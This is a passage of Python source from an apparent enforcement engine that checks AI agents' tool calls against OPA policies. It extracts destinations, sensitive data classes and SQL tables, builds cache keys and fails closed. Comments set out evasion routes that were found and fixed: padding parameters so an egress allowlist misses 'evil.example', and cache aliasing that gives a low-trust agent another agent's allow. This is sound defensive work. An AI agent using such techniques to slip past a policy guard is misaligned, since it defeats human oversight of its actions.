                if prefix in out and out[prefix] != clipped:
                    ambiguous.add(prefix)
                if forged or len(value) > self._MAX_PATH_VALUE_LEN:
                    ambiguous.add(prefix)
                out[prefix] = clipped

        walk(node, "", 0, False)
        # Paths that RENDER identically are one path to everyone who reads them — the console, the
        # compiled rule label, the near-miss explainer — so a rule pinned on the visible spelling is
        # answered by whichever twin the caller ordered last. Raw string comparison cannot see it:
        # NFC and NFD "café" are different dict keys. Both twins are named; neither is rewritten.
        folded: dict[str, str] = {}
        for path in out:
            key = _fold_path(path)
            twin = folded.setdefault(key, path)
            if twin != path:
                ambiguous.add(path)
                ambiguous.add(twin)
        return out, sorted(ambiguous)

    def _destination_keyed_hosts(self, node: object) -> set[str]:
        """NORMALISED hosts sitting under a key that NAMES a network location.

        The key is the half of the signal the value cannot carry (see the _BARE_HOST_RE comment), and
        `_destinations` only sees a flat list of values, so the association has to be made here.

        BOUNDED ON THE NORMALISED HOST, NOT THE RAW VALUE, and that distinction is the whole
        difference between a bound and a starvation primitive. Collecting raw strings meant 64 SPELLINGS
        of one already-allowlisted host — `API.acme.com`, `Api.acme.com`, `api.acme.com.`, all of which
        collapse to a single entry in the output — filled the budget, the walk stopped BEFORE reaching
        `{"host": "evil.example"}`, and `destinations.hosts` came back as exactly `["api.acme.com"]`:
        a correctly authored `subsetOf` allowlist passed and the call to the attacker's host was
        allowed. Measured. It is the same eviction that made the first bare-host change net-negative,
        arriving through a new door, so the budget now counts what actually reaches the output — an
        alias costs nothing because it adds nothing.

        Filling the budget for real therefore means 64 DISTINCT hosts, which fills `hosts` and fails a
        `subsetOf` CLOSED unless every one of the 64 is itself allowlisted. Depth is capped like every
        other walk here.
        """
        found: set[str] = set()

        def walk(value: object, key: str, depth: int) -> None:
            if depth > self._MAX_PATH_DEPTH or len(found) >= self._MAX_DESTINATIONS:
                return
            if isinstance(value, dict):
                for child_key, child in value.items():
                    walk(child, str(child_key), depth + 1)
                    if len(found) >= self._MAX_DESTINATIONS:
                        return
                return
            if isinstance(value, (list, tuple)):
                for child in value:
                    # A list inherits the key that held it: {"endpoints": ["a.example", "b.example"]}.
                    # A nested DICT does not: its own keys are the ones that describe its values, so
                    # `{"webhook": {"url": "evil.example"}}` is harvested via `url` while
                    # `{"webhook": {"v": "evil.example"}}` is the stated residual below.
                    walk(child, key, depth + 1)
                    if len(found) >= self._MAX_DESTINATIONS:
                        return
                return
            if isinstance(value, str) and _key_names_a_destination(key):
                candidate = value.strip()
                if len(candidate) > self._MAX_PATH_VALUE_LEN:
                    return
                parsed = _parse_bare_destination(candidate)
                if parsed:
                    found.add(parsed[0])

        walk(node, "", 0)
        return found

    def _destinations(self, values: list, dest_keyed: set[str] | frozenset[str] = frozenset()) -> dict:
        """Emails, URLs, hosts and schemes found anywhere in the params.

        Reported as sorted, de-duplicated lists so a policy can use set operations (`subsetOf`)
        without caring about ordering or repetition.

        `dest_keyed` carries the NORMALISED hosts that sat under a destination-shaped argument name
        (_destination_keyed_hosts); a schemeless value with no marker of its own is harvested only if
        its host is in there. Matching on the normalised host rather than the raw string adds no host
        that the destination-keyed occurrence would not have contributed by itself — the same value is
        in `values` — while making the budget on the other side count hosts instead of spellings.
        Defaults to empty, so a caller that passes bare values gets the marker rule alone rather than
        the shape-only harvest that was measured at 0% precision.
        """
        emails: set[str] = set()
        urls: set[str] = set()
        hosts: set[str] = set()
        schemes: set[str] = set()
        for raw in values:
            emails.update(_emails(raw))
            for match in _URL_RE.findall(raw):
                urls.add(match)
                parsed = urlsplit(match)
                if parsed.scheme:
                    schemes.add(parsed.scheme.lower())
                if parsed.hostname:
                    # `api.acme.com.` and `api.acme.com` are one host; an allowlist naming the second
                    # must not be sidestepped — or refused — by the root dot.
                    hosts.add(parsed.hostname.lower().rstrip("."))
            # A schemeless destination is still a destination. Only the HOST is recorded — not a url
            # and not a scheme — because that is all the value actually asserts: inventing
            # `https://evil.example/collect` from `evil.example/collect` would put a claim in the
            # input document that the call never made, and `destinations.schemes` is used to reason
            # about the protocol, which a schemeless value leaves genuinely unknown.
            bare = _parse_bare_destination(raw)
            if bare:
                host, marked = bare
                # Bounded WITHOUT joining the break budget below. Counting harvested hosts toward the
                # stop condition made this change net-negative: 80 benign dotted strings
                # ("svc0.internal.example", …) filled the budget, the walk stopped BEFORE reaching the
                # real recipient, and `destinations.emails`/`urls` came back EMPTY — so a correctly
                # authored `subsetOf` egress rule went vacuously true and allowed the call it was
                # written to refuse. Measured: alone the payload yields the attacker's address and
                # URL; padded, both lists are [].
                #
                # A cheap harvest must never be able to evict the expensive, high-signal findings.
                if (marked or host in dest_keyed) and len(hosts) < self._MAX_DESTINATIONS:
                    hosts.add(host)
            # UNCHANGED from before bare-host extraction: only emails and urls stop the walk.
            if len(emails) + len(urls) > self._MAX_DESTINATIONS:
                break
        cap = self._MAX_DESTINATIONS
        return {
            "emails": sorted(emails)[:cap],
            "urls": sorted(urls)[:cap],
            "hosts": sorted(hosts)[:cap],
            "schemes": sorted(schemes)[:cap],
        }

    def _data_classes(self, params: object, values: list) -> list:
        """Sensitive-data classes carried by the REQUEST: pci | pii | secret.

        Key-name detection and value-shape detection are both used, because each misses what the
        other catches: `{"password": "hunter2"}` has an innocuous value, and a bare AWS key in a
        free-text `body` has an innocuous key.
        """
        classes: set[str] = set()
        for raw in values:
            if _PAN_RE.search(raw):
                classes.add("pci")
            if _SSN_RE.search(raw):
                classes.add("pii")
            if _SECRET_VALUE_RE.search(raw):
                classes.add("secret")
        # Sensitive KEY names (password, api_key, token, …) — reused from the masking module so the
        # request-side classifier and the response-side masker cannot drift apart.
        for key in self._walk_keys(params):
            if key.lower() in _SENSITIVE_KEYS:
                classes.add("secret")
                break
        return sorted(classes)

    def _walk_keys(self, node: object, depth: int = 0):
        """Every dict key in the params, bounded by the same depth cap as the path walk."""
        if depth > self._MAX_PATH_DEPTH:
            return
        if isinstance(node, dict):
            for key, value in node.items():
                if isinstance(key, str):
                    yield key
                yield from self._walk_keys(value, depth + 1)
        elif isinstance(node, (list, tuple)):
            for value in node:
                yield from self._walk_keys(value, depth + 1)

    def _sql_tables(self, sql_like: str) -> list:
        """Table names referenced by FROM / JOIN / INTO / UPDATE / TRUNCATE.

        Deliberately NOT a SQL parser. It is an aid for writing `subsetOf: [orders]` rather than
        pinning an exact statement, and a policy that needs certainty should still gate on
        `sql_normalized`. Anything it fails to recognise simply does not appear, which under
        deny-by-default means the rule does not match — the safe direction.
        """
        found: list[str] = []
        for match in _SQL_TABLE_RE.findall(sql_like or ""):
            name = (match or "").strip('`"[] ').lower()
            # strip a schema qualifier: public.orders -> orders
            if "." in name:
                name = name.rsplit(".", 1)[-1]
            if name and name not in found:
                found.append(name)
        return found[: self._MAX_DESTINATIONS]

    def _walk_values(self, node: object) -> list:
        """Every leaf value in an arbitrarily nested params structure."""
        if isinstance(node, dict):
            out: list = []
            for v in node.values():
                out.extend(self._walk_values(v))
            return out
        if isinstance(node, (list, tuple)):
            out = []
            for v in node:
                out.extend(self._walk_values(v))
            return out
        return [node]

    def _tool_kind(self, tool_name: str) -> str:
        """Coarse classification by name/alias so a rename cannot slip past a kind-based rule."""
        name = (tool_name or "").lower()
        if name in self._SQL_TOOL_NAMES or any(s in name for s in self._SQL_TOOL_SUBSTRINGS):
            return "sql"
        return "other"

    def _sql_candidate(self, values: list) -> str:
        """The param value most likely to BE the SQL, regardless of which key held it."""
        for v in values:
            low = v.lower().strip()
            if any(low.startswith(kw) for kw in ("select", "insert", "update", "delete", "drop", "truncate", "alter", "with")):
                return v
        return ""

    @staticmethod
    def _normalize_sql(raw: str) -> str:
        """Case-fold, collapse internal whitespace, strip trailing semicolon/space — so trivial
        formatting differences do not defeat an exact-match allowlist (the false-positive that gets a
        policy switched off in week one)."""
        return " ".join(raw.split()).strip().rstrip(";").strip().lower()

    async def _persist_behavior(self, event: ToolCallEvent, decision: PolicyDecision, trust_result: TrustResult) -> None:
        """Persist trust state, enforced outcome history, and profile evolution."""
        self._queue_background(self._safe_set_trust(event.agent_identity.spiffe_id, trust_result))
        self._queue_background(self._safe_register_agent(event, trust_result, decision))
        await self._post_decision(event, decision)
        self._queue_background(self._safe_record_graph(event, decision))
        self._queue_background(self._safe_record_history(event, decision))
        self._queue_background(self._safe_update_profile(event, decision))
        self._queue_audit(decision)

    async def _restore_graph(self, namespace: str) -> None:
        """GRAPH-RESTORE: on the FIRST record for a namespace after a process start, restore the persisted
        snapshot into the live builder. Without this, a pod restart begins from an EMPTY graph and the next
        save clobbers the accumulated snapshot with just the new call — the asset/attack graphs silently
        lose every node built before the restart (graph amnesia on every deploy)."""
        if namespace in self._graphs or self._graph_store is None:
            return
        try:
            restored = await self._graph_store.load(namespace)
        except Exception as exc:  # pragma: no cover - cache/DB outage must not block the decision path
            log.error("nrvq.engine.graph.restore_failed", namespace=namespace, error=str(exc),
                      code="NRVQ-GRP-11016")
            return
        if restored is not None:
            self._graphs[namespace] = restored
            log.info("nrvq.engine.graph.restored", namespace=namespace,
                     nodes=restored.graph.number_of_nodes(), code="NRVQ-GRP-11017")

    async def _safe_record_graph(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
        """Record graph updates and persist snapshots without blocking decisions."""
        try:
            namespace = event.agent_identity.namespace or "default"
            await self._restore_graph(namespace)
            graph = self.get_graph(namespace)
            graph.record_tool_call(
                spiffe_id=event.agent_identity.spiffe_id,
                tool_name=event.tool_name,
                decision=decision.decision,
                namespace=namespace,
                agent_class=event.agent_identity.agent_class,
                # The agent node used to keep add_agent's 0.8 DEFAULT forever, because this call never
                # passed a score and nothing else ever updated one. The consequences were all downstream
                # and all silent: the inspector's "Min trust" read 0.80 for every agent; the kill-chain
                # severity formula collapsed to exactly two values, so the Critical and Low filter chips
                # and the "Critical paths" stat could never match anything; and
                # GET /api/v1/graph/critical-paths always returned []. The real score is right here on
                # the decision we just made — it is the same number _persist_behavior stores.
                trust_score=decision.trust_score,
            )
            if self._graph_store is not None:
                await self._graph_store.save(namespace, graph)
        except Exception as exc:  # pragma: no cover
            log.error("nrvq.engine.graph.record_failed", error=str(exc), code="NRVQ-GRP-11001")

    async def _safe_set_trust(self, spiffe_id: str, trust_result: TrustResult) -> None:
        """Persist trust score/factors while tolerating Redis failures."""
        try:
            await self._cache.set_trust(
                spiffe_id,
                TrustScore(
                    score=trust_result.score,
                    category=trust_result.category.title(),
                    factors={
                        "signals": trust_result.signals,
                        "weights": trust_result.weights,
                        "dominant_signal": trust_result.dominant_signal,
                        "recommendation": trust_result.recommendation,
                    },
                ),
            )
        except Exception as exc:  # pragma: no cover
            log.error("nrvq.engine.trust.cache_set_failed", error=str(exc), code="NRVQ-ENG-2049")

    async def _safe_register_agent(self, event: ToolCallEvent, trust_result: TrustResult,
                                   decision: PolicyDecision | None = None) -> None:
        """Write-through the agent's latest trust to the persistent registry (best-effort).

        Keeps the Agents view populated after the short-lived ``trust:*`` cache TTL expires.
        Fire-and-forget: a missing/unreachable DB (tests, cold start) must never fail a decision.
        """
        try:
            from norviq.api.db.session import get_session, upsert_agent_registry

            provider = get_session()
            session = await provider.__anext__()
            try:
                await upsert_agent_registry(
                    session,
                    spiffe_id=event.agent_identity.spiffe_id,
                    namespace=event.agent_identity.namespace or "default",
                    agent_class=event.agent_identity.agent_class,
                    trust_score=trust_result.score,
                    trust_category=trust_result.category.title(),
                    # A blocked or escalated call is what "violation" means on the Agent Monitor. The
                    # count was never incremented by anything, so its column could not move off 0 and
                    # its amber/red thresholds were unreachable.
                    #
                    # SYNTHETIC TRAFFIC IS EXCLUDED. The red-team simulator builds its events with the
                    # REAL agent's SVID (redteam.py _build_event), so one admin "Run suite" click wrote
                    # ~26-34 fabricated violations onto every governed agent in the namespace and put
                    # the whole fleet in the red band for attacks that never happened. Same framework
                    # marker the audit view already uses to separate simulated from real.
                    violation=(
                        str(getattr(decision, "decision", "")) in ("block", "escalate")
                        and not _is_synthetic_framework(getattr(event, "framework", ""))
                    ),
                )
                await session.commit()
            finally:
                await provider.aclose()
        except Exception as exc:  # pragma: no cover
            log.error("nrvq.engine.agent_registry.write_failed", error=str(exc), code="NRVQ-ENG-2051")

    async def _safe_record_history(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
        """Persist enforced decision for rolling trust-history features."""
        try:
            await self._history.record(
                event.agent_identity.spiffe_id,
                {
                    "tool_name": event.tool_name,
                    "decision": decision.decision,
                    "param_hash": self._params_digest(event),
                    "chain_depth": event.call_depth,
                    "timestamp": decision.decided_at.isoformat(),
                    "timestamp_unix": decision.decided_at.timestamp(),
                },
            )
        except Exception as exc:  # pragma: no cover
            log.error("nrvq.engine.trust.history_failed", error=str(exc), code="NRVQ-ENG-2043")

    async def _safe_update_profile(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
        """Update profile only for trusted outcomes using raw entropy baseline."""
        if decision.decision not in {"allow", "audit"}:
            return
        try:
            entropy = ParamEntropySignal.entropy_of_params(event.tool_params)
            rpm = await self._observed_rpm(event)
            await self._profile.update_profile(event.agent_identity.spiffe_id, event.tool_name, entropy, rpm, decision.decision)
        except Exception as exc:  # pragma: no cover
            log.error("nrvq.engine.trust.profile_failed", error=str(exc), code="NRVQ-ENG-2044")

    async def _observed_rpm(self, event: ToolCallEvent) -> float:
        """Estimate current calls-per-minute from recent history window."""
        history = await self._history.get_history(event.agent_identity.spiffe_id)
        now = datetime.now(timezone.utc).timestamp()
        recent = sum(1 for row in history if float(row.get("timestamp_unix", 0.0)) >= now - 60)
        return float(recent + 1)

    def _queue_background(self, work: Awaitable[None]) -> None:
        """Run non-critical persistence without blocking decision path."""
        task = asyncio.create_task(work)
        self._audit_tasks.add(task)
        task.add_done_callback(self._audit_tasks.discard)

    # Facts published per IDENTITY rather than per (namespace, agent_class, tool, params). The eval
    # cache is keyed on the class, so a decision that turns on one of these cannot be shared.
    _PER_IDENTITY_FACTS = ("input.trust_score", "input.trust_category", "input.agent.spiffe_id")

    @classmethod
    def _depends_on_per_identity_facts(cls, candidates: list[dict]) -> bool:
        """True when any candidate policy reads a fact that varies BETWEEN agents of the same class.

        The eval cache keys on (namespace, agent_class, tool+params+depth+workload+mcp) — deliberately
        class-scoped, so two agents of a class share an entry. `_handle_cache_hit` re-applies the
        namespace posture threshold, the freeze/cap and monitor mode on every hit, so those stay live.
        What it does NOT re-run is the cached rego decision. A rule of the form
        `deny if input.trust_score < 0.7` — authorable from the visual builder's `trustBelow` and from
        the intent compiler's `trust_score` field — was therefore evaluated once for whichever agent
        called first, and every other agent of that class was served that answer for the TTL. Where the
        rule's threshold was stricter than the namespace posture (the whole reason to write one), a
        low-trust agent got a high-trust agent's allow.

        Skipping the cache WRITE is the fix rather than adding trust to the key. The key is built before
        the cache read, and the read shares one pipelined Redis round trip with the freeze/cap fetch, so
        the freshly computed score is not available there. The stored score is — but `_persist_behavior`
        writes a newly computed trust back after EVERY evaluation, so keying on it changes the key on
        every call and the cache never hits again. (Measured: it turned test_cache_hit_skips_opa's
        second identical call into a miss.) Not writing an entry means there is never one to serve
        wrongly, costs caching only for the policies that actually depend on per-agent state, and leaves
        every other policy's hit rate untouched.
        """
        for candidate in candidates:
            rego = candidate.get("rego") or ""
            if any(fact in rego for fact in cls._PER_IDENTITY_FACTS):
                return True
        return False

    @staticmethod
    def _params_digest(event: "ToolCallEvent") -> str:
        """The tool_params fingerprint, as its own function so callers never parse it back out of the
        composite cache key.

        `_safe_record_history` used to do `cache_tool.split(":")[-1]` and call the result `param_hash`.
        It never was one: the key is `{tool}:{digest}:d{depth}:w{workload}[:m…][:t…]`, so the last
        segment is the WORKLOAD (or the MCP hash, once that term was added) — meaning the rolling
        trust-history feature that is supposed to notice "same tool, same arguments, over and over" was
        comparing a value that is constant for an agent, and every call looked like a repeat. Indexing
        from the front would not fix it either, because an MCP tool name legitimately contains a colon.
        """
        payload = json.dumps(event.tool_params, sort_keys=True, separators=(",", ":"))
        return hashlib.sha256(payload.encode("utf-8")).hexdigest()[:16]

    def _cache_tool_key(self, event: "ToolCallEvent") -> str:
        """Build the eval-cache key suffix from EVERY decision-relevant input dimension, not just tool +
        params. SECURITY (cache-key-scope, fail-open): the 5s eval cache keys on (namespace, agent_class,
        <this suffix>); any decision input NOT in the suffix lets one call's cached decision shadow a
        different call's within the TTL — an enforcement bypass. Two such inputs were omitted and are added
        here: `call_depth` (drives the chain_depth_limit / OWASP-LLM08 anti-recursion block — a shallow-depth
        allow must NOT shadow a deep-depth block) and `workload` (workload-tier `deployment:` policies — one
        workload's decision must NOT bleed to another sharing tool+params). Include them so the cached
        decision is only ever served for an identical decision input.

        `mcp` is the third such input, and it was omitted for the same reason the first two were: it
        became decision-relevant after this key was written. `_build_input` publishes the whole document
        as `input.mcp` and lifts `input.direction` from it, so a policy can gate on `pin_status`,
        `scan_severity`, `schema_enforced` or `surface`. Without it, two calls with identical
        tool+params but different MCP context — the SAME tool once `pinned` and once in `drift`, or a
        `tools/call` and a `resources/read` — alias inside the 5s TTL, and the second is served the
        first's decision. That is a drift block silently downgraded to an allow.

        The WHOLE document is hashed, not a hand-picked subset. A subset would have to be kept in step
        with `_mcp_context` in the proxy forever, and the day someone adds a fact there without adding
        it here the bypass returns silently — two components keyed differently on one concept, which is
        the failure this key already exists to prevent. Every field in that document is derived at
        DISCOVERY and stable per (tool, catalog state), so hashing all of it costs no hit rate. The term
        is omitted entirely when there is no MCP context, so non-MCP traffic keeps its existing key and
        does not churn: absent and `{}` are the same decision input (`input.mcp == {}` either way)."""
        digest = self._params_digest(event)
        workload = getattr(event.agent_identity, "workload", "") or ""
        depth = int(getattr(event, "call_depth", 0) or 0)
        key = f"{event.tool_name}:{digest}:d{depth}:w{workload}"
        mcp = getattr(event, "mcp", None) or {}
        if mcp:
            blob = json.dumps(mcp, sort_keys=True, separators=(",", ":"), default=str)
            key = f"{key}:m{hashlib.sha256(blob.encode('utf-8')).hexdigest()[:16]}"
        return key

    def _extract_package_name(self, rego_source: str) -> str | None:
        """Extract package name from Rego source header."""
        if not rego_source:
            return None
        match = self._PACKAGE_RE.search(rego_source)
        if not match:
            return None
        return match.group(1).strip()

    def _opa_query_for_package(self, package_name: str | None) -> str:
        """Build OPA query path for a package root object."""
        if package_name:
            return f"data.{package_name}"
        return "data.norviq.strict"

    def _no_policy_decision(self, key: str, namespace: str) -> dict:
        """Decide when NO policy is loaded for `key`. Deny-by-default for a PEP (enforcement_mode=block),
        with three distinct, loudly-logged cases so a startup/load anomaly is never mistaken for genuine no-policy.

        - load FAILURE never reaches here: load_from_db raises -> evaluate() fail-closes (NRVQ-ENG-2000).
        - not-yet-warmed (loader bound but warm load incomplete) -> deny `policy_load_pending` (distinct alarm).
        - genuine no-policy for an enforcing namespace -> deny `no_policy_loaded` (block mode) or allow (audit mode).
        """
        loader = getattr(self, "_loader", None)
        warmed = getattr(loader, "_warmed", True) if loader is not None else True
        if not warmed:
            log.warning("nrvq.engine.policy_load_pending", key=key, namespace=namespace, code="NRVQ-ENG-2056")
            return {"decision": "block", "rule_id": "policy_load_pending", "reason": "Policy subsystem not ready"}
        if settings.enforcement_mode == "block" and str(settings.no_policy_decision).lower() == "deny":
            log.warning("nrvq.engine.no_policy_loaded", key=key, namespace=namespace, code="NRVQ-ENG-2055")
            return {"decision": "block", "rule_id": "no_policy_loaded",
                    "reason": "No policy loaded for namespace (default-deny)"}
        return {"decision": "allow", "rule_id": "default_allow", "reason": "No policy matched"}

    async def _evaluate_opa(
        self, key: str, namespace: str, agent_class: str, opa_input: dict, rego_source: str = ""
    ) -> dict:
        """Resolve the policy source for `key` and evaluate it (server HTTP or subprocess fork)."""
        rego = rego_source
        package_name: str | None = None
        if not rego.strip():
            entry = self._policies.get(key)
            if isinstance(entry, dict):
                rego = str(entry.get("rego", ""))
                package_name = str(entry.get("package_name", "")).strip() or None
        if not rego.strip():
            return self._no_policy_decision(key, namespace)
        if settings.opa_mode == "server":
            return await self._evaluate_opa_server(key, rego, opa_input)
        return await self._evaluate_opa_subprocess(namespace, agent_class, opa_input, rego, package_name)

    async def _track_dryrun_module(self, key: str) -> None:
        """LRU-bound the ephemeral dry-run OPA modules so an authenticated user can't grow the OPA server
        + _pushed map without limit by dry-running arbitrary ns/class strings. Past the cap, evict the oldest
        dry-run module (delete it from OPA + drop its digest); a re-used key simply re-pushes on next dry-run."""
        self._dryrun_keys[key] = None
        self._dryrun_keys.move_to_end(key)
        while len(self._dryrun_keys) > _MAX_DRYRUN_MODULES:
            old_key, _ = self._dryrun_keys.popitem(last=False)
            self._pushed.pop(old_key, None)
            try:
                await self.opa.delete_policy(sanitize_key(old_key))
            except Exception:  # noqa: BLE001 — best-effort cleanup; OPA over-writes by module_id anyway
                pass

    async def _ensure_module_pushed(self, key: str, rego: str) -> None:
        """Push (or re-push) `key`'s module when its digest changed; a no-op once OPA already has it.

        Split out of _evaluate_opa_server so the caller can warm the module OUTSIDE the per-call
        evaluation deadline. Compiling a module is a one-time CONTROL-plane cost, and charging it to a
        DATA-plane deadline made the first call after every policy change a fail-closed
        `evaluator_timeout` block: OPA stops serving while it recompiles the store, the in-flight
        evaluate blew the 2s budget, and one legitimate tool call was wrongly blocked per policy edit.
        Digest-guarded and idempotent, so the call left in _evaluate_opa_server stays correct on its own
        (the warm is an optimisation, never the only push).
        """
        if settings.opa_mode != "server":
            return
        digest = hashlib.sha256(rego.encode("utf-8")).hexdigest()
        if self._pushed.get(key) == digest:
            return
        await self.opa.push_policy(sanitize_key(key), rewrite_package(rego, managed_package(key)))
        self._pushed[key] = digest
        if key.startswith("dryrun:"):
            await self._track_dryrun_module(key)

    async def _warm_module(self, key: str, rego: str) -> None:
        """Best-effort pre-deadline warm. Never raises: a failure here just leaves the push to the
        evaluation path (which still pushes, retries once, and fails closed if genuinely broken), so
        warming can only improve the outcome, never degrade it."""
        try:
            await asyncio.wait_for(self._ensure_module_pushed(key, rego), timeout=_MODULE_WARM_TIMEOUT_S)
        except Exception as exc:  # noqa: BLE001 — best-effort; the eval path re-pushes and owns the verdict
            log.warning("nrvq.opa.warm_failed", key=key, error=str(exc), code="NRVQ-ENG-2063")

    async def _evaluate_opa_server(self, key: str, rego: str, opa_input: dict) -> dict:
        """Evaluate against the long-lived OPA server; push (or re-push) the module as needed."""
        package = managed_package(key)
        module_id = sanitize_key(key)
        digest = hashlib.sha256(rego.encode("utf-8")).hexdigest()
        await self._ensure_module_pushed(key, rego)
        result = await self.opa.query(package, opa_input)
        if result is None:
            # OPA lost in-memory state (sidecar restart) — re-push this module once and retry.
            log.warning("nrvq.opa.module_missing", key=key, code="NRVQ-ENG-2057")
            await self.opa.push_policy(module_id, rewrite_package(rego, package))
            self._pushed[key] = digest
            result = await self.opa.query(package, opa_input)
        if not isinstance(result, dict):
            return {"decision": "block", "rule_id": "evaluator_invalid_payload", "reason": "No policy decision produced"}
        if self._fired_without_decision(result):
            return {"decision": "block", "rule_id": "evaluator_invalid_payload",
                    "reason": "policy produced no decision (partial-set rule fired without a resolver)"}
        return {
            "decision": str(result.get("decision", "allow")),
            "rule_id": str(result.get("rule_id", "")),
            "reason": str(result.get("reason", "")),
        }

    async def _evaluate_opa_subprocess(
        self, namespace: str, agent_class: str, opa_input: dict, rego: str, package_name: str | None
    ) -> dict:
        """Evaluate Rego source via a per-call `opa eval` fork (rollback path)."""
        if package_name is None:
            package_name = self._extract_package_name(rego)
        query = self._opa_query_for_package(package_name)
        log.debug(
            "nrvq.opa.query.resolved",
            package_name=package_name or "(none)",
            query=query,
            namespace=namespace,
            agent_class=agent_class,
            code="NRVQ-ENG-DEBUG-QUERY",
        )

        with tempfile.TemporaryDirectory(prefix="norviq-opa-") as tmpdir:
            policy_path = os.path.join(tmpdir, "policy.rego")
            input_path = os.path.join(tmpdir, "input.json")
            with open(policy_path, "w", encoding="utf-8") as policy_file:
                policy_file.write(rego)
            with open(input_path, "w", encoding="utf-8") as input_file:
                json.dump(opa_input, input_file)

            if settings.debug_opa_logging:
                log.debug(
                    "nrvq.opa.input",
                    rego_preview=rego[:200],
                    input_doc=str(self._redacted_input(opa_input))[:500],  # masked even when debug on
                    package_name=package_name or "",
                    query=query,
                    code="NRVQ-ENG-DEBUG-OPA-IN",
                )

            proc = await asyncio.create_subprocess_exec(
                "opa",
                "eval",
                "--format=json",
                "--v0-compatible",
                "--data",
                policy_path,
                "--input",
                input_path,
                query,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            if settings.debug_opa_logging:
                log.debug(
                    "nrvq.opa.subprocess_done",
                    returncode=proc.returncode,
                    stdout_len=len(stdout),
                    stdout_preview=stdout.decode("utf-8", errors="replace")[:500],
                    stderr_preview=stderr.decode("utf-8", errors="replace")[:500],
                    code="NRVQ-ENG-DEBUG-OPA",
                )

        if proc.returncode != 0:
            raise RuntimeError(f"opa eval failed: {stderr.decode('utf-8', errors='replace').strip()}")

        parsed = json.loads(stdout.decode("utf-8"))
        value = self._extract_opa_value(parsed)
        if value is None:
            return {"decision": "block", "rule_id": "evaluator_invalid_payload", "reason": "No policy decision produced"}
        if isinstance(value, dict):
            if self._fired_without_decision(value):
                return {"decision": "block", "rule_id": "evaluator_invalid_payload",
                        "reason": "policy produced no decision (partial-set rule fired without a resolver)"}
            return {
                "decision": str(value.get("decision", "allow")),
                "rule_id": str(value.get("rule_id", "")),
                "reason": str(value.get("reason", "")),
            }
        return {"decision": "block", "rule_id": "evaluator_invalid_payload", "reason": "Invalid policy decision payload"}

    @staticmethod
    def _fired_without_decision(value: dict) -> bool:
        """True when a partial-set rule FIRED (blocks/escalates/audits non-empty) but the module
        produced no top-level `decision` — i.e. a decision-producing rule matched but there is no resolver
        to turn it into a decision. Defaulting such a result to "allow" would silently ALLOW a fired block.
        Fail closed only in this exact case, so a legitimate complete-rule policy whose condition simply did
        not match (no partial sets, decision undefined -> allow) is unaffected."""
        if "decision" in value:
            return False
        return bool(value.get("blocks") or value.get("escalates") or value.get("audits"))

    def _extract_opa_value(self, payload: object) -> object | None:
        """Extract first expression value from OPA eval JSON response."""
        if not isinstance(payload, dict):
            return None
        try:
            return payload["result"][0]["expressions"][0]["value"]
        except (KeyError, IndexError, TypeError):
            return None

    def _eval_slot(self):
        """Concurrency gate: serialize subprocess `opa eval` forks; no gate in server mode (OPA + the
        httpx pool absorb concurrency, which is what flattens the tail under load)."""
        if settings.opa_mode == "server":
            return contextlib.nullcontext()
        return self._semaphore

    async def _evaluate_single(
        self, event: ToolCallEvent, key: str, rego_source: str, trust_result: TrustResult
    ) -> PolicyDecision:
        """Evaluate one candidate policy source and return typed decision.

        A TRANSIENT OPA failure (e.g. the server-mode module lazy-load/push race right after a policy
        apply) must not fall straight through to a fail-closed `evaluator_error` block — a CLEAN, well-formed
        input would then be recorded as `evaluator_error` and mistaken for a real policy decision. So this retries
        ONCE (server mode re-pushes the module on the second attempt), so a transient error self-heals and a clean
        input never yields `evaluator_error`. Only a PERSISTENT engine error stays fail-closed, and it is counted
        + logged distinctly so it is visible as an engine-health signal, never confused with a policy rule. The
        retry runs ONLY on the error path, so the happy path keeps its latency."""
        last_exc: Exception | None = None
        for attempt in (1, 2):
            try:
                input_doc = self._build_input(event, trust_result)
                # Gated AND masked — raw tool_params never logged, so SSN/PAN/PHI cannot leak to an INFO line.
                if settings.debug_opa_logging and attempt == 1:
                    log.debug("nrvq.eval.opa_input", input_doc=str(self._redacted_input(input_doc))[:500],
                             code="NRVQ-ENG-DEBUG-INPUT")
                result = await self._evaluate_opa(
                    key, event.agent_identity.namespace, event.agent_identity.agent_class, input_doc, rego_source
                )
                if attempt > 1:
                    log.info("nrvq.eval.opa_recovered", key=key, attempt=attempt, code="NRVQ-ENG-2056")
                return self._build_decision(result, event, trust_result, 0.0)
            except Exception as exc:  # noqa: BLE001 — fail-closed engine-error path
                last_exc = exc
                log.warning("nrvq.eval.opa_retry" if attempt == 1 else "nrvq.eval.opa_failed",
                            key=key, attempt=attempt, error=str(exc), code="NRVQ-ENG-2062")
        # Persistent engine error → fail closed with a DISTINCT reason + a counted, observable engine-health
        # signal so it is never mistaken for a policy decision (a real policy block carries a policy rule_id).
        self._engine_error_count += 1
        log.error("nrvq.eval.opa_failed_persistent", key=key, error=str(last_exc),
                  traceback=traceback.format_exc(), engine_error_count=self._engine_error_count,
                  code="NRVQ-ENG-2057")
        result = {
            "decision": "block",
            "rule_id": "evaluator_error",
            "reason": "OPA evaluation failed (engine error, fail-closed) — not a policy decision",
        }
        return self._build_decision(result, event, trust_result, 0.0)

    def _build_decision(
        self, result: dict, event: ToolCallEvent, trust_result: TrustResult, elapsed_ms: float
    ) -> PolicyDecision:
        """Build policy decision model from rule evaluation output."""
        return PolicyDecision(
            decision=result.get("decision", settings.enforcement_mode),
            rule_id=result.get("rule_id", ""),
            reason=result.get("reason", ""),
            trust_score=trust_result.score,
            trust_category=trust_result.category,
            trust_signals=trust_result.signals,
            trust_dominant_signal=trust_result.dominant_signal,
            trust_recommendation=trust_result.recommendation,
            latency_ms=round(elapsed_ms, 2),
            event_id=event.event_id,
        )

    async def _collect_candidates(self, event: ToolCallEvent) -> list[dict]:
        """Collect candidate policies from loader state by specificity."""
        if self._loader is None:
            return []
        namespace = event.agent_identity.namespace
        agent_class = event.agent_identity.agent_class or ""
        # The console's global picker sends namespace="all", which is NOT a real caller namespace (a
        # real agent always carries a concrete one). Resolve it to the UNION of every namespace that actually
        # holds a policy for this class — the same union the asset/attack graphs use — so /evaluate and
        # /policies/effective report the real winning layer (e.g. deny_shell_execution) instead of a misleading
        # no_policy_loaded. The concrete-namespace collection below is left byte-identical (decision parity).
        if namespace == "all":
            return await self._collect_candidates_union(agent_class)
        candidates = []

